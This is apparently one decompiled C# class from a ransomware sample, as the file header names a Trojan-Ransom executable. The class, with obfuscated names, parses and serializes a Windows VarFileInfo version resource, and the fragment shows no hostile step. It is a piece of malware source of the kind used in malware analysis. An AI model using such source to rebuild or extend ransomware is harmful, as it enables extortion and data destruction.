// Decompiled with JetBrains decompiler
// Type: ns5.Class24
// Assembly: TRM, Version=1.0.4536.20171, Culture=neutral, PublicKeyToken=null
// MVID: 017B0DCA-B8B5-40B9-B848-18A1270CDB8F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan-Ransom.Win32.Generic-08b2c37daa8dd06294ac2deaa8689a195e18fd9674da39ab2a4fad9b91baa664.exe

using ns0;
using ns8;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

namespace ns5
{
  internal sealed class Class24 : Class20
  {
    private Dictionary<string, Class23> dictionary_0 = new Dictionary<string, Class23>();

    [SpecialName]
    public Dictionary<string, Class23> method_3() => this.dictionary_0;

    public Class24()
      : base("VarFileInfo")
    {
      this.struct2_0.ushort_2 = (ushort) 1;
    }

    internal Class24(IntPtr intptr_0) => this.vmethod_0(intptr_0);

    internal override IntPtr vmethod_0(IntPtr intptr_0)
    {
      this.dictionary_0.Clear();
      Class23 class23;
      for (IntPtr intptr_0_1 = base.vmethod_0(intptr_0); intptr_0_1.ToInt32() < intptr_0.ToInt32() + (int) this.struct2_0.ushort_0; intptr_0_1 = Class15.smethod_0(intptr_0_1.ToInt32() + (int) class23.method_1().ushort_0))
      {
        class23 = new Class23(intptr_0_1);
        this.dictionary_0.Add(class23.method_0(), class23);
      }
      return new IntPtr(intptr_0.ToInt32() + (int) this.struct2_0.ushort_0);
    }

    internal override void vmethod_1(BinaryWriter binaryWriter_0)
    {
      long position = binaryWriter_0.BaseStream.Position;
      base.vmethod_1(binaryWriter_0);
      Dictionary<string, Class23>.Enumerator enumerator = this.dictionary_0.GetEnumerator();
      while (enumerator.MoveNext())
        enumerator.Current.Value.vmethod_1(binaryWriter_0);
      Class15.smethod_5(binaryWriter_0, binaryWriter_0.BaseStream.Position - position, position);
    }

    [SpecialName]
    public Class23 method_4()
    {
      Dictionary<string, Class23>.Enumerator enumerator = this.dictionary_0.GetEnumerator();
      return enumerator.MoveNext() ? enumerator.Current.Value : (Class23) null;
    }

    public ushort this[ushort ushort_0]
    {
      get => this.method_4()[ushort_0];
      set => this.method_4()[ushort_0] = value;
    }

    public override string vmethod_2(int int_0)
    {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.AppendLine(string.Format("{0}BEGIN", (object) new string(' ', int_0)));
      foreach (Class23 class23 in this.dictionary_0.Values)
        stringBuilder.Append(class23.vmethod_2(int_0 + 1));
      stringBuilder.AppendLine(string.Format("{0}END", (object) new string(' ', int_0)));
      return stringBuilder.ToString();
    }
  }
}
